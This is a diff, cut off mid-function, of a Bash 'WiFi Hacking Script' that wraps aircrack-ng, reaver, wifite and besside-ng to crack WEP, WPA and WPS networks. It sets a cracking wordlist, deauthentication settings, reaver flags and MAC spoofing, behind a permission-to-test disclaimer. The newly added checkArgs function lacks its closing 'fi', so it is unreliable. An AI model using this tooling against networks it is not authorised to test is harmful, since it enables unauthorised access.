@@ -185,86 +185,102 @@
 
 initMain(){
 
-checkLinuxVersion
+	#checkArgs
 
-killAll
-#startNetworkManager
+	checkLinuxVersion
 
-getCurrentDate
-getCurrentTime
-getCurrentDateAndTime
+	killAll
+	#startNetworkManager
 
-setDependencies
-checkDependencies
+	getCurrentDate
+	getCurrentTime
+	getCurrentDateAndTime
 
-resizeWindow
-setVariables
-setVariablesRequired
-setVariablesOptional
-setVariablesAdvanced
+	setDependencies
+	checkDependencies
 
-setDefaults
+	resizeWindow
+	setVariables
+	setVariablesRequired
+	setVariablesOptional
+	setVariablesAdvanced
 
-setDefaultsWEP
-setDefaultsWPA
-setDefaultsWPA2
-setDefaultsWPS
+	setDefaults
 
-setDefaultSession
+	setDefaultsWEP
+	setDefaultsWPA
+	setDefaultsWPA2
+	setDefaultsWPS
+
+	setDefaultSession
 
 
-# Optionally show dependencies before launch
-#showDependencies
+	# Optionally show dependencies before launch
+	#showDependencies
 
-# Optionally Show Disclaimer Before Launch
-showDisclaimer
+	# Optionally Show Disclaimer Before Launch
+	showDisclaimer
 
-# Optionally Show Unreleased Text Before Launch
-#isUnreleased
+	# Optionally Show Unreleased Text Before Launch
+	#isUnreleased
 
-# Load Main Menu
-menuMain
+	# Load Main Menu
+	menuMain
 
+}
+
+checkArgs(){
+
+	case "$#" in
+	
+	"1")
+		if [ -e $1 ]; then
+			echo "File $1 Exists"
+		else
+			echo "File $1 Does Not Exist"
+	;;
+	
+	esac
 }
 
 checkLinuxVersion(){
 
-# Set both default Kali values to ON and if blank, Kali is not present
-isKali=1
-isKaliTwo=1
+	# Set both default Kali values to ON and if blank, Kali is not present
+	isKali=1
+	isKaliTwo=1
 
-# Get Linux Build Info
-linuxVersion=$(lsb_release -a | grep Description | cut -f2 -d":")
+	# Get Linux Build Info
+	linuxVersion=$(lsb_release -a | grep Description | cut -f2 -d":")
 
-# Check against the Linux Version for the presence of Kali
-kali=$(echo "$linuxVersion" | grep Kali)
+	# Check against the Linux Version for the presence of Kali
+	kali=$(echo "$linuxVersion" | grep Kali)
 
-# Check against the Linux Version for the presence of Kali 2.x
-kaliTwo=$(echo "$linuxVersion" | grep Kali | grep 2.)
+	# Check against the Linux Version for the presence of Kali 2.x
+	kaliTwo=$(echo "$linuxVersion" | grep Kali | grep 2.)
 
-# Check For Kali Linux
-case "$kali" in
+	# Check For Kali Linux
+	case "$kali" in
 
-"")
-isKali=0
+	"")
+	isKali=0
 
-esac
+	esac
 
-# Check For Kali Linux 2.x (Monitor Mode Is Different)
-case "$kaliTwo" in
+	# Check For Kali Linux 2.x (Monitor Mode Is Different)
+	case "$kaliTwo" in
 
-"")
-isKaliTwo=0
-;;
+	"")
+	isKaliTwo=0
+	;;
 
-esac
+	esac
 
-#echo "Linux Version: $linuxVersion"
-#echo ""
-#echo "Is Kali?: $isKali"
-#echo ""
-#echo "Is Kali 2.x?: $isKaliTwo"
-#read pause
+	#echo "Linux Version: $linuxVersion"
+	#echo ""
+	#echo "Is Kali?: $isKali"
+	#echo ""
+	#echo "Is Kali 2.x?: $isKaliTwo"
+	#read pause
 }
 
 
@@ -283,171 +299,171 @@ esac
 
 setDependencies(){
 
-pathAircrack="/usr/bin/aircrack-ng"
-pathAirodump="/usr/sbin/airodump-ng"
-pathBesside="/usr/sbin/besside-ng"
-pathCut="/usr/bin/cut"
-pathDate="/bin/date"
-pathGrep="/bin/grep"
-pathHead="/usr/bin/head"
-pathLink="/usr/bin/link"
-pathMacchanger="/usr/bin/macchanger"
-pathMkdir="/bin/mkdir"
-pathReaver="/usr/bin/reaver"
-pathRmdir="/bin/rmdir"
-pathSed="/bin/sed"
-pathSleep="/bin/sleep"
-pathTail="/usr/bin/tail"
+	pathAircrack="/usr/bin/aircrack-ng"
+	pathAirodump="/usr/sbin/airodump-ng"
+	pathBesside="/usr/sbin/besside-ng"
+	pathCut="/usr/bin/cut"
+	pathDate="/bin/date"
+	pathGrep="/bin/grep"
+	pathHead="/usr/bin/head"
+	pathLink="/usr/bin/link"
+	pathMacchanger="/usr/bin/macchanger"
+	pathMkdir="/bin/mkdir"
+	pathReaver="/usr/bin/reaver"
+	pathRmdir="/bin/rmdir"
+	pathSed="/bin/sed"
+	pathSleep="/bin/sleep"
+	pathTail="/usr/bin/tail"
 
 }
 
 
 checkDependencies(){
 
-if [ -f $pathAircrack ];
-then
-   statusPathAircrack="OK"
-else
-   statusPathAircrack="NA"
-fi
+	if [ -f $pathAircrack ];
+	then
+	   statusPathAircrack="OK"
+	else
+	   statusPathAircrack="NA"
+	fi
 
-if [ -f $pathAirodump ];
-then
-   statusPathAirodump="OK"
-else
-   statusPathAirodump="NA"
-fi
+	if [ -f $pathAirodump ];
+	then
+	   statusPathAirodump="OK"
+	else
+	   statusPathAirodump="NA"
+	fi
 
-if [ -f $pathBesside ];
-then
-   statusPathBesside="OK"
-else
-   statusPathBesside="NA"
-fi
+	if [ -f $pathBesside ];
+	then
+	   statusPathBesside="OK"
+	else
+	   statusPathBesside="NA"
+	fi
 
-if [ -f $pathCut ];
-then
-   statusPathCut="OK"
-else
-   statusPathCut="NA"
-fi
+	if [ -f $pathCut ];
+	then
+	   statusPathCut="OK"
+	else
+	   statusPathCut="NA"
+	fi
 
-if [ -f $pathDate ];
-then
-   statusPathDate="OK"
-else
-   statusPathDate="NA"
-fi
+	if [ -f $pathDate ];
+	then
+	   statusPathDate="OK"
+	else
+	   statusPathDate="NA"
+	fi
 
-if [ -f $pathGrep ];
-then
-   statusPathGrep="OK"
-else
-   statusPathGrep="NA"
-fi
+	if [ -f $pathGrep ];
+	then
+	   statusPathGrep="OK"
+	else
+	   statusPathGrep="NA"
+	fi
 
-if [ -f $pathHead ];
-then
-   statusPathHead="OK"
-else
-   statusPathHead="NA"
-fi
+	if [ -f $pathHead ];
+	then
+	   statusPathHead="OK"
+	else
+	   statusPathHead="NA"
+	fi
 
-if [ -f $pathLink ];
-then
-   statusPathLink="OK"
-else
-   statusPathLink="NA"
-fi
+	if [ -f $pathLink ];
+	then
+	   statusPathLink="OK"
+	else
+	   statusPathLink="NA"
+	fi
 
-if [ -f $pathMacchanger ];
-then
-   statusPathMacchanger="OK"
-else
-   statusPathMacchanger="NA"
-fi
+	if [ -f $pathMacchanger ];
+	then
+	   statusPathMacchanger="OK"
+	else
+	   statusPathMacchanger="NA"
+	fi
 
-if [ -f $pathMkdir ];
-then
-   statusPathMkdir="OK"
-else
-   statusPathMkdir="NA"
-fi
+	if [ -f $pathMkdir ];
+	then
+	   statusPathMkdir="OK"
+	else
+	   statusPathMkdir="NA"
+	fi
 
-if [ -f $pathReaver ];
-then
-   statusPathReaver="OK"
-else
-   statusPathReaver="NA"
-fi
+	if [ -f $pathReaver ];
+	then
+	   statusPathReaver="OK"
+	else
+	   statusPathReaver="NA"
+	fi
 
-if [ -f $pathRmdir ];
-then
-   statusPathRmdir="OK"
-else
-   statusPathRmdir="NA"
-fi
+	if [ -f $pathRmdir ];
+	then
+	   statusPathRmdir="OK"
+	else
+	   statusPathRmdir="NA"
+	fi
 
-if [ -f $pathSed ];
-then
-   statusPathSed="OK"
-else
-   statusPathSed="NA"
-fi
+	if [ -f $pathSed ];
+	then
+	   statusPathSed="OK"
+	else
+	   statusPathSed="NA"
+	fi
 
-if [ -f $pathSleep ];
-then
-   statusPathSleep="OK"
-else
-   statusPathSleep="NA"
-fi
+	if [ -f $pathSleep ];
+	then
+	   statusPathSleep="OK"
+	else
+	   statusPathSleep="NA"
+	fi
 
-if [ -f $pathTail ];
-then
-   statusPathTail="OK"
-else
-   statusPathTail="NA"
-fi
+	if [ -f $pathTail ];
+	then
+	   statusPathTail="OK"
+	else
+	   statusPathTail="NA"
+	fi
 
 }
 
 
 downloadDependencies(){
 
-blank=""
+	blank=""
 
 }
 
 
 showDependencies(){
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo ""
-echo "List of File Dependencies Needed"
-echo ""
-echo "$pathAircrack - Status: $statusPathAircrack"
-echo "$pathAirodump - Status: $statusPathAirodump"
-echo "$pathBesside - Status: $statusPathBesside"
-echo "$pathCut - Status: $statusPathCut"
-echo "$pathDate - Status: $statusPathDate"
-echo "$pathGrep - Status: $statusPathGrep"
-echo "$pathHead - Status: $statusPathHead"
-echo "$pathLink - Status: $statusPathLink"
-echo "$pathMacchanger - Status: $statusPathMacchanger"
-echo "$pathMkdir - Status: $statusPathMkdir"
-echo "$pathReaver - Status: $statusPathReaver"
-echo "$pathRmdir - Status: $statusPathRmdir"
-echo "$pathSed - Status: $statusPathSed"
-echo "$pathSleep - Status: $statusPathSleep"
-echo "$pathTail - Status: $statusPathTail"
-echo ""
-echo ""
+	echo ""
+	echo "List of File Dependencies Needed"
+	echo ""
+	echo "$pathAircrack - Status: $statusPathAircrack"
+	echo "$pathAirodump - Status: $statusPathAirodump"
+	echo "$pathBesside - Status: $statusPathBesside"
+	echo "$pathCut - Status: $statusPathCut"
+	echo "$pathDate - Status: $statusPathDate"
+	echo "$pathGrep - Status: $statusPathGrep"
+	echo "$pathHead - Status: $statusPathHead"
+	echo "$pathLink - Status: $statusPathLink"
+	echo "$pathMacchanger - Status: $statusPathMacchanger"
+	echo "$pathMkdir - Status: $statusPathMkdir"
+	echo "$pathReaver - Status: $statusPathReaver"
+	echo "$pathRmdir - Status: $statusPathRmdir"
+	echo "$pathSed - Status: $statusPathSed"
+	echo "$pathSleep - Status: $statusPathSleep"
+	echo "$pathTail - Status: $statusPathTail"
+	echo ""
+	echo ""
 
-echo "Press ENTER to continue...."
+	echo "Press ENTER to continue...."
 
-read pause
+	read pause
 
 }
 
@@ -467,44 +483,44 @@ read pause
 
 setWindowTitle(){
 
-currentTask="setWindowTitle"
+	currentTask="setWindowTitle"
 
-title='echo -ne "\033]0;WiFi Hacker v1.3\007"'
+	title='echo -ne "\033]0;WiFi Hacker v1.3\007"'
 
-$title
+	$title
 
 }
 
 
 resizeWindow(){
 
-currentTask="resizeWindow"
+	currentTask="resizeWindow"
 
-printf '\033[8;32;115t'
+	printf '\033[8;32;115t'
 
 }
 
 
 setVariables(){
 
-currentTask="setVariables"
+	currentTask="setVariables"
 
-terminal="gnome-terminal -x"
-terminalGnome="gnome-terminal -x"
-terminalKonsole="konsole -e"
-terminalXterm="xterm -e"
+	terminal="gnome-terminal -x"
+	terminalGnome="gnome-terminal -x"
+	terminalKonsole="konsole -e"
+	terminalXterm="xterm -e"
 
-bin=""
-startMonitorMode="airmon-ng start"
-stopMonitorMode="airmon-ng stop"
+	bin=""
+	startMonitorMode="airmon-ng start"
+	stopMonitorMode="airmon-ng stop"
 
-getRandomMacAddress=""
-spoofStatus="0"
+	getRandomMacAddress=""
+	spoofStatus="0"
 
-encryptionType="empty"
-encryptionTypeText="Empty"
+	encryptionType="empty"
+	encryptionTypeText="Empty"
 
-ipStatus="0"
+	ipStatus="0"
 
 }
 
@@ -524,168 +540,166 @@ ipStatus="0"
 
 setVariablesRequired(){
 
-currentTask="setVariablesRequired"
+	currentTask="setVariablesRequired"
 
-interface=""
-interfaceMonitor=""
-interfaceName="wlan0"
-interfaceMode="0"
-bssid=""
-essid=""
-channel=""
+	interface=""
+	interfaceMonitor=""
+	interfaceName="wlan0"
+	interfaceMode="0"
+	bssid=""
+	essid=""
+	channel=""
 
 }
 
 
 setVariablesOptional(){
 
-currentTask="setVariablesOptional"
+	currentTask="setVariablesOptional"
 
-blank=""
+	blank=""
 
 }
 
 
 setVariablesAdvanced(){
 
-currentTask="setVariablesAdvanced"
+	currentTask="setVariablesAdvanced"
 
-blank=""
+	blank=""
 
 }
 
 
 setDefaults(){
 
-currentTask="setDefaults"
+	currentTask="setDefaults"
 
-versionBase="v1.3"
+	versionBase="v1.3"
 
-initPath="$PWD"
+	initPath="$PWD"
 
 }
 
 
 setDefaultsWEP(){
 
-currentTask="setDefaultsWEP"
+	currentTask="setDefaultsWEP"
 
-# aircrack-ng cracking mode WEP
-acMode="1"
+	# aircrack-ng cracking mode WEP
+	acMode="1"
 
-# aircrack-ng cracking mode WEP (WPA-PSK)
-#acMode="2"
+	# aircrack-ng cracking mode WEP (WPA-PSK)
+	#acMode="2"
 
 }
 
 
 setDefaultsWPA(){
 
-currentTask="setDefaultsWPA"
+	currentTask="setDefaultsWPA"
 
-wordlist="darkc0de.lst"
+	wordlist="darkc0de.lst"
 
-retryDeauth="0"
+	retryDeauth="0"
 
-serverWPA=""
+	serverWPA=""
 
 }
 
 
 setDefaultsWPA2(){
 
-currentTask="setDefaultsWPA2"
+	currentTask="setDefaultsWPA2"
 
 }
 
 
 setDefaultsWPS(){
 
-currentTask="setDefaultsWPS"
+	currentTask="setDefaultsWPS"
 
-reaver="reaver"
+	reaver="reaver"
 
-reaverSessionPath="etc/reaver"
-bssidCharOnly=""
+	reaverSessionPath="etc/reaver"
+	bssidCharOnly=""
 
-reaverInterfaceInput=""
-reaverBSSIDInput=""
+	reaverInterfaceInput=""
+	reaverBSSIDInput=""
 
-reaverChannelInput=""
-reaverESSIDInput=""
-reaverExecInput=""
-reaverMACInput=""
-reaverOutfileInput=""
-reaverSessionInput=""
+	reaverChannelInput=""
+	reaverESSIDInput=""
+	reaverExecInput=""
+	reaverMACInput=""
+	reaverOutfileInput=""
+	reaverSessionInput=""
 
-reaverDelayInput=""
-reaverFailWaitInput=""
-reaverM57TimeoutInput=""
-reaverMaxAttemptsInput=""
-reaverPinInput=""
-reaverTimeoutInput=""
+	reaverDelayInput=""
+	reaverFailWaitInput=""
+	reaverM57TimeoutInput=""
+	reaverMaxAttemptsInput=""
+	reaverPinInput=""
+	reaverTimeoutInput=""
 
-reaverDelay="--delay="
-reaverDHSmall="--dh-small"
-reaverEAPTerminate="--eap-terminate"
-reaverFailWait="--fail-wait="
-reaverIgnoreLocks="--ignore-locks"
-reaverM57Timeout="--m57-timeout="
-reaverMaxAttempts="--max-attempts="
-reaverNack="--nack"
-reaverNoAssociate="--no-associate"
-reaverNoNacks="--no-nacks"
-reaverPin="--pin="
-reaverRecurringDelay="--recurring-delay"
-reaverTimeout="--timeout="
-reaverWin7False="--win7"
+	reaverDelay="--delay="
+	reaverDHSmall="--dh-small"
+	reaverEAPTerminate="--eap-terminate"
+	reaverFailWait="--fail-wait="
+	reaverIgnoreLocks="--ignore-locks"
+	reaverM57Timeout="--m57-timeout="
+	reaverMaxAttempts="--max-attempts="
+	reaverNack="--nack"
+	reaverNoAssociate="--no-associate"
+	reaverNoNacks="--no-nacks"
+	reaverPin="--pin="
+	reaverRecurringDelay="--recurring-delay"
+	reaverTimeout="--timeout="
+	reaverWin7False="--win7"
 
-reaver5ghz="--5ghz"
-reaverAuto="--auto"
-reaverChannel="--channel="
-reaverDaemonize="--daemonize"
-reaverESSID="--essid="
-reaverExec="--exec="
-reaverFixed="--fixed"
-reaverHelp="--help"
-reaverMAC="--mac="
-reaverOutfile="--out-file="
-reaverQuiet="--quiet"
-reaverSession="--session="
-reaverVerbose="-v"
-reaverVerboseMore="-vv"
-
-
-wifite="wifite"
-wifiteAttackAll="wifite -all"
-wifiteAttackWEP="wifite -wep"
-wifiteAttackWPA="wifite -wpa"
-wifiteAttackWPA2="wifite -wpa"
-wifiteAttackWPS="wifite -wps"
+	reaver5ghz="--5ghz"
+	reaverAuto="--auto"
+	reaverChannel="--channel="
+	reaverDaemonize="--daemonize"
+	reaverESSID="--essid="
+	reaverExec="--exec="
+	reaverFixed="--fixed"
+	reaverHelp="--help"
+	reaverMAC="--mac="
+	reaverOutfile="--out-file="
+	reaverQuiet="--quiet"
+	reaverSession="--session="
+	reaverVerbose="-v"
+	reaverVerboseMore="-vv"
 
 
-
+	wifite="wifite"
+	wifiteAttackAll="wifite -all"
+	wifiteAttackWEP="wifite -wep"
+	wifiteAttackWPA="wifite -wpa"
+	wifiteAttackWPA2="wifite -wpa"
+	wifiteAttackWPS="wifite -wps"
+	
 }
 
 
 setDefaultSession(){
 
-currentTask="setDefaultSession"
+	currentTask="setDefaultSession"
 
-sessionID="0"
+	sessionID="0"
 
-capturePath=$(echo "$PWD/sessions")
-capturePathWEP=$(echo "$PWD/sessions/wep")
-capturePathWPS=$(echo "$PWD/sessions/wps")
-capturePathWPA=$(echo "$PWD/sessions/wpa")
-capturePathWPA2=$(echo "$PWD/sessions/wpa2")
+	capturePath=$(echo "$PWD/sessions")
+	capturePathWEP=$(echo "$PWD/sessions/wep")
+	capturePathWPS=$(echo "$PWD/sessions/wps")
+	capturePathWPA=$(echo "$PWD/sessions/wpa")
+	capturePathWPA2=$(echo "$PWD/sessions/wpa2")
 
 }
 
 
 setVariablesPostExploitation(){
 
-blank=""
+	blank=""
 
 }
 
@@ -705,61 +719,61 @@ blank=""
 
 showDisclaimer(){
 
-currentTask="showDisclaimer"
-lastMenuID="showDisclaimer"
+	currentTask="showDisclaimer"
+	lastMenuID="showDisclaimer"
 
-sessionCreatePaths
-sessionRemoveEmpty
+	sessionCreatePaths
+	sessionRemoveEmpty
 
-bannerMenu
+	bannerMenu
 
-echo ""
-echo "**********************************************************"
-echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
-echo "**********************************************************"
-echo ""
-echo "By using this script, you are agreeing to the following terms:"
-echo ""
-echo "1) THIS WILL TERMINATE ANY ACTIVE INTERNET CONNECTION! IF YOU HAVE ISSUES CONNECTING TO THE INTERNET"
-echo "   AFTER AN ATTACK HAS BEEN PERFORMED, USE THE EXTRAS OPTION IN TOOLBAR TO START AND STOP SERVICES."
-echo "   IF THIS DOES NOT WORK, THEN YOU CAN RESTART THIS SCRIPT, OR REBOOT THE MACHINE AND RETURN TO NORMAL."
-echo ""
-echo "2) Not to be used for attacking access points that you do not have permission to test"
-echo ""
-echo "3) Stay within legal limits of transmission power"
-echo ""
-echo "4) Stay within legal limits of channel usage, depending on your country laws"
-echo ""
-echo "**********************************************************"
-echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
-echo "**********************************************************"
-echo ""
-echo ""
-echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
-echo ""
+	echo ""
+	echo "**********************************************************"
+	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
+	echo "**********************************************************"
+	echo ""
+	echo "By using this script, you are agreeing to the following terms:"
+	echo ""
+	echo "1) THIS WILL TERMINATE ANY ACTIVE INTERNET CONNECTION! IF YOU HAVE ISSUES CONNECTING TO THE INTERNET"
+	echo "   AFTER AN ATTACK HAS BEEN PERFORMED, USE THE EXTRAS OPTION IN TOOLBAR TO START AND STOP SERVICES."
+	echo "   IF THIS DOES NOT WORK, THEN YOU CAN RESTART THIS SCRIPT, OR REBOOT THE MACHINE AND RETURN TO NORMAL."
+	echo ""
+	echo "2) Not to be used for attacking access points that you do not have permission to test"
+	echo ""
+	echo "3) Stay within legal limits of transmission power"
+	echo ""
+	echo "4) Stay within legal limits of channel usage, depending on your country laws"
+	echo ""
+	echo "**********************************************************"
+	echo "YOU MUST AGREE TO THESE TERMS BEFORE USING THIS SOFTWARE!"
+	echo "**********************************************************"
+	echo ""
+	echo ""
+	echo "PLEASE PRESS "\""Y"\"" AND ENTER TO ACCEPT AND CONTINUE"
+	echo ""
 
-read agreeToDisclaimer
+	read agreeToDisclaimer
 
-case "$agreeToDisclaimer" in
+	case "$agreeToDisclaimer" in
 
-"")
-bannerExit
-;;
+	"")
+	bannerExit
+	;;
 
-"Y" | "y")
-fixNegativeOneChannelError
-startNetworkManager
-#killNetworkManager
-#killWpaSupplicant
-#initMonitorMode
-menuMain
-;;
+	"Y" | "y")
+	fixNegativeOneChannelError
+	startNetworkManager
+	#killNetworkManager
+	#killWpaSupplicant
+	#initMonitorMode
+	menuMain
+	;;
 
-*)
-bannerExit
-;;
+	*)
+	bannerExit
+	;;
 
-esac
+	esac
 
 }
 
@@ -779,114 +793,114 @@ esac
 
 banner(){
 
-setWindowTitle
+	setWindowTitle
 
-currentTask="banner"
+	currentTask="banner"
 
-clear
+	clear
 
-echo "---------------------    ****************************************************************    ----------------------"
-echo "|  [M] Main Menu    |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [X] Exit           |"
-echo "---------------------    ****************************************************************    ----------------------"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo ""
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "|  [M] Main Menu    |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [X] Exit           |"
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo ""
 
 }
 
 
 bannerNoMenu(){
 
-currentTask="bannerNoMenu"
+	currentTask="bannerNoMenu"
 
-setWindowTitle
+	setWindowTitle
 
-clear
+	clear
 
-echo "---------------------    ****************************************************************    ----------------------"
-echo "|  [ CTRL+C ] Main  |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C x2 ] Exit  |"
-echo "---------------------    ****************************************************************    ----------------------"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo ""
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "|  [ CTRL+C ] Main  |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C x2 ] Exit  |"
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo ""
 
 }
 
 
 bannerMain(){
 
-currentTask="bannerMain"
+	currentTask="bannerMain"
 
-setWindowTitle
+	setWindowTitle
 
-clear
+	clear
 
-echo "---------------------    ****************************************************************    ----------------------"
-echo "|  [ ]              |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C    ] Exit  |"
-echo "---------------------    ****************************************************************    ----------------------"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo ""
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "|  [ ]              |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C    ] Exit  |"
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo ""
 
 }
 
 bannerMenu(){
 
-currentTask="bannerMenu"
+	currentTask="bannerMenu"
 
-setWindowTitle
+	setWindowTitle
 
-clear
+	clear
 
-echo "---------------------    ****************************************************************    ----------------------"
-echo "|  [ ]              |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C    ] Exit  |"
-echo "---------------------    ****************************************************************    ----------------------"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
-echo "-------------------------------------------------------------------------------------------------------------------"
-#echo ""
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "|  [ ]              |    * WiFi Hacking Script $versionBase / esc0rtd3w 2016 / crackacademy.com *    | [CTRL+C    ] Exit  |"
+	echo "---------------------    ****************************************************************    ----------------------"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo "| Connection: $ipStatus  |  [A] Advanced  |  [Z] HoneyPot Mode  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "| Connection: $ipStatus  |  Interface Mode: $interfaceMode  |  [A] Advanced  |  Sessions: [S] Save  [L] Load  |  [E] Extras  [H] Help  |"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	#echo ""
 
 }
 
 
 bannerStats(){
 
-currentTask="bannerStats"
+	currentTask="bannerStats"
 
-echo "-------------------------------------------------------------------------------------------------------------------"
-echo "Interface Name: $interfaceName / MAC: $macAddressMonitor / ESSID: $essid / BSSID: $bssid / Channel: $channel"
-echo "-------------------------------------------------------------------------------------------------------------------"
-echo ""
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	echo "Interface Name: $interfaceName / MAC: $macAddressMonitor / ESSID: $essid / BSSID: $bssid / Channel: $channel"
+	echo "-------------------------------------------------------------------------------------------------------------------"
+	echo ""
 
 }
 
 bannerExit(){
 
-currentTask="bannerExit"
+	currentTask="bannerExit"
 
-sessionWriteEndCurrent
+	sessionWriteEndCurrent
 
-sessionRemoveEmpty
+	sessionRemoveEmpty
 
-NetworkManager
+	NetworkManager
 
-enableChannelHopping
+	enableChannelHopping
 
-clear
-echo "Thank You For Playing Fair ;)"
-echo ""
-echo "esc0rtd3w 2016 / crackacademy.com"
-echo ""
-echo ""
+	clear
+	echo "Thank You For Playing Fair ;)"
+	echo ""
+	echo "esc0rtd3w 2016 / crackacademy.com"
+	echo ""
+	echo ""
 
-exit
+	exit
 
 }
 
@@ -906,11 +920,11 @@ exit
 
 doSleepMessage(){
 
-currentTask="doSleepMessage"
+	currentTask="doSleepMessage"
 
-banner
-bannerStats
-echo "$sleepMessage"
+	banner
+	bannerStats
+	echo "$sleepMessage"
 
 }
 
@@ -930,22 +944,22 @@ echo "$sleepMessage"
 
 checkRootStatus(){
 
-userPriv=none
+	userPriv=none
 
-isRoot=$(whoami | grep root)
+	isRoot=$(whoami | grep root)
 
-#echo "$isRoot"
+	#echo "$isRoot"
 
-case "$isRoot" in
+	case "$isRoot" in
 
-"root")
-userPriv=root
+	"root")
+	userPriv=root
 
-esac
+	esac
 
-if [ "$userPriv" != "root" ]; then
-noRootAccess
-fi
+	if [ "$userPriv" != "root" ]; then
+	noRootAccess
+	fi
 
 }
 
@@ -953,200 +967,200 @@ fi
 
 noRootAccess(){
 
-banner
-bannerStats
+	banner
+	bannerStats
 
-echo "Yikes! No Root Access!"
-echo ""
-echo ""
-echo "I Currently Have Nothing Scripted To Handle This :("
-echo ""
-echo "Please login as a root user and try again!"
-echo ""
-echo ""
-echo "Press ENTER to exit this script...."
-echo ""
-echo ""
+	echo "Yikes! No Root Access!"
+	echo ""
+	echo ""
+	echo "I Currently Have Nothing Scripted To Handle This :("
+	echo ""
+	echo "Please login as a root user and try again!"
+	echo ""
+	echo ""
+	echo "Press ENTER to exit this script...."
+	echo ""
+	echo ""
 
-read pause
+	read pause
 
 
-bannerExit
+	bannerExit
 
 }
 
 
 checkConnectionStatus(){
 
-ipStatus="0"
-ipStatusText="None"
+	ipStatus="0"
+	ipStatusText="None"
 
-ipStatusTemp=$(ping -c 1 google.com | grep "1 received")
+	ipStatusTemp=$(ping -c 1 google.com | grep "1 received")
 
-ipStatus=$(echo "$ipStatusTemp" | cut -c1)
+	ipStatus=$(echo "$ipStatusTemp" | cut -c1)
 
 
-case "$ipStatus" in
+	case "$ipStatus" in
 
-"1")
-ipStatus="1"
-ipStatusText="Wifi"
-;;
+	"1")
+	ipStatus="1"
+	ipStatusText="Wifi"
+	;;
 
-esac
+	esac
 
-case "$ipStatusText" in
+	case "$ipStatusText" in
 
-"None")
-ipStatus="0"
-;;
+	"None")
+	ipStatus="0"
+	;;
 
-esac
+	esac
 
-#echo "$ipStatusText"
+	#echo "$ipStatusText"
 
-#read pause
+	#read pause
 
 }
 
 
 checkWifiandDisplayMessage(){
 
-case "$ipStatusText" in
+	case "$ipStatusText" in
 
-"m"|"M")
-menuMain
-;;
+	"m"|"M")
+	menuMain
+	;;
 
-"A" | "a")
-menuAdvanced
-;;
+	"A" | "a")
+	menuAdvanced
